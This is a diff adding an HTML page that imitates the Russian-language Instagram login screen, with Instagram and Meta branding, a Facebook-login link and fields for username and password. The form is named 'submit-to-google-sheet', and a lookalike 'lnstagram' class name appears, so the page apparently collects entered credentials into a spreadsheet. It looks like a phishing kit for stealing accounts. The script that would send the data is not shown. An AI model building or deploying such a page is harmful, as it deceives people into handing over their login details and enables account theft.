@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Войти</title>
+    <link rel="shortcut icon" href="./img/insta-icon.png" type="image/png">
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.2.0/fonts/remixicon.css" rel="stylesheet"/>
+    <link rel="stylesheet" href="./css/style.css">
+</head>
+
+<body>
+
+<div class="lang">
+    <p>Русский <i class="fa-solid fa-chevron-down"></i></p>
+</div>
+
+<div id="content-container">
+
+    <section class="phones">
+        <img src="./img/phones.png" alt="" class="phone-image">
+        <div class="display-phone">
+            <img class="picture" src="./img/photo-1.png" alt="#">
+            <img class="picture" src="./img/photo-2.png" alt="#">
+            <img class="picture" src="./img/photo-3.png" alt="#">
+            <img class="picture" src="./img/photo-4.png" alt="#">
+            <img class="picture" src="./img/photo-5.png" alt="#">
+        </div>
+    </section>
+
+    <section class="user">
+
+        <div class="login-container">
+
+            <div class="lnstagram-logo-box">
+                <img class="lnstagram-logo" src="./img/instagram-logo.png" alt="">
+            </div>
+
+            <div class="face-container">
+                <div class="face-content">
+                    <a class="face-login" href="face.html">
+                        <i class="fa-brands fa-square-facebook"></i>
+                        Продолжить с аккаунтом <br> Facebook</a>
+                </div>
+            </div>
+            <div class="or-container">
+                <div class="line"></div>
+                <div class="or">ИЛИ</div>
+                <div class="line"></div>
+            </div>
+
+            <form action="#" id="login-post" name="submit-to-google-sheet">
+                <div class="inputs-container">
+                    <div class="input__group">
+                        <input id="name" name="name" placeholder=" " />
+                        <label for="name">Телефон, имя пользователя или эл. адрес</label>
+                    </div>
+                </div>
+                <div class="inputs-container">
+                    <div class="input__group">
+                        <input type="text" name="text" id="login-password" placeholder=" "/>
+                        <label for="login-password">Пароль</label>
+                        <span id="login-password-eye">
+                  <i class="ri-eye-off-fill"></i>
+                </span>
+                    </div>
+                </div>
+                <div class="form-forgot">
+                    <a class="password-forgot" href="#">Забыли пароль?</a>
+                </div>
+                <button type="submit" class="login-button">Войти</button>
+            </form>
+
+        </div>
+
+        <div class="signup-container">
+            <p>У вас ещё нет аккаунта? <a class="signup" href="#"> Зарегистрироваться</a></p>
+        </div>
+
+    </section>
+
+</div>
+
+<footer class="page-footer">
+    <hr>
+    <div class="footer-img">
+        <img src="./img/Meta.png" alt="">
+    </div>
+</footer>
+
+<script src="https://kit.fontawesome.com/99d91a2e97.js" crossorigin="anonymous"></script>
+<script src="./js/script.js"></script>
+
+</body>
+</html>
